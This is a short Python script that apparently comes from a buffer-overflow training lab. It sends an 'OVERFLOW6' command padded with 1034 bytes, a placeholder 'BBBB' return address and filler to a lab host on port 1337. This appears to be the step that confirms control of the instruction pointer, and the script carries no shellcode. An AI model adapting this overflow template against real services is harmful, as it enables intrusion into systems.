import socket, struct

host, port = "10.10.243.3", 1337

command = b'OVERFLOW6 '

offset = 1034
new_eip = b'BBBB'
length = 1500

payload = b''.join([
command,
b'A'*offset,
new_eip,
b'C' * (length - offset - len(new_eip))

])


with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
